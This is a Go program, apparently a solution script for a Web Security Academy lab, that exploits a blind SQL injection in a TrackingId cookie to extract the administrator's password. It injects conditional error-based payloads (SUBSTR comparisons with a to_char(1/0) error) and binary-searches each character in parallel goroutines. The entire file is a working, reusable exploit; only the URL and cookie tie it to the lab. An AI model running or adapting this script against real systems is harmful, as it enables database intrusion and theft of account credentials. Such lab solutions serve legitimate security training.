package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"sync"
)

const (
	url     = "https://ac801fd71feb226180168abd0041006c.web-security-academy.net"
	trackID = "iL5UB3fEQwzSO4A1"
	pwdLen  = 20
)

var charset []int

func prepareChar() []int {
	// for j := 33; j <= 64; j++ {
	// 	charset = append(charset, j)
	// 	// fmt.Println(j, ":", string(j))
	// }
	// for j := 91; j <= 96; j++ {
	// 	charset = append(charset, j)
	// 	// fmt.Println(j, ":", string(j))
	// }
	// for j := 123; j <= 126; j++ {
	// 	charset = append(charset, j)
	// 	// fmt.Println(j, ":", string(j))
	// }

	return charset
}

func prepare09() []int {
	for j := 48; j <= 57; j++ {
		charset = append(charset, j)
	}

	return charset
}

func prepareAZ() []int {
	for j := 65; j <= 90; j++ {
		charset = append(charset, j)
	}

	return charset
}

func prepareaz() []int {
	for j := 97; j <= 122; j++ {
		charset = append(charset, j)
	}

	return charset
}

func _match(idx, v int, payload string, compare func(*http.Response, string) bool) bool {
	cookie := fmt.Sprintf(payload, trackID, idx, string(v))
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		log.Fatal(err)
	}
	request.Header.Set("Cookie", cookie)
	client := http.DefaultClient

	response, err := client.Do(request)
	if response != nil {
		defer response.Body.Close()
	} else {
		return false
	}

	if err != nil {
		fmt.Println("request error:")
		fmt.Println(err)
	}

	return compare(response, cookie)
}

func compare_body(resp *http.Response, cookie string) bool {
	responseContent, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	match := strings.Contains(string(responseContent), "Welcome back!")
	if match {
		fmt.Printf("payload: %s: %v\n", cookie, match)
	}

	return match
}

func compare_response_code(resp *http.Response, cookie string) bool {
	match := resp.StatusCode == 200
	if match {
		fmt.Printf("payload: %s: %v\n", cookie, match)
	}

	return match
}

func equal(idx, v int) bool {
	payload := "TrackingId=%s' and (select case when ( SUBSTR(password,%d,1) = '%s' ) then 'a' else to_char(1/0) end from users where username = 'administrator') = 'a"
	// payload := "TrackingId=%s' and (select '1' from users where username = 'administrator' and substring(password, %d, 1) = '%s') = '1' --"
	return _match(idx, v, payload, compare_response_code)
}

func biggerThan(idx, v int) bool {
	payload := "TrackingId=%s' and (select case when ( SUBSTR(password,%d,1) > '%s' ) then 'a' else to_char(1/0) end from users where username = 'administrator') = 'a"
	// payload := "TrackingId=%s' and (select '1' from users where username = 'administrator' and substring(password, %d, 1) > '%s') = '1' --"
	return _match(idx, v, payload, compare_response_code)
}

func probe(idx int, res chan [2]int, wg *sync.WaitGroup) {
	defer wg.Done()
	start := 0
	end := len(charset) - 1
	for start <= end {
		mid := (start + end) / 2
		switch {
		case equal(idx, charset[mid]):
			res <- [2]int{idx, charset[mid]}
			return
		case biggerThan(idx, charset[mid]):
			start = mid + 1
			// if equal(idx, charset[end]) {
			// 	res <- [2]int{idx, charset[end]}
			// 	return
			// }
		default:
			// if equal(idx, charset[start]) {
			// 	res <- [2]int{idx, charset[start]}
			// 	return
			// }
			end = mid - 1
		}
	}
}

func main() {
	// prepareaz()
	prepare09()
	// prepareAZ()
	res := make(chan [2]int, 1)
	result := make([]int, 30)
	go func() {
		for r := range res {
			result[r[0]] = r[1]
		}
	}()

	wg := sync.WaitGroup{}
	for i := 1; i <= pwdLen; i++ {
		wg.Add(1)
		go probe(i, res, &wg)

	}

	wg.Wait()
	close(res)
	for _, v := range result {
		fmt.Print(string(v))
	}
}
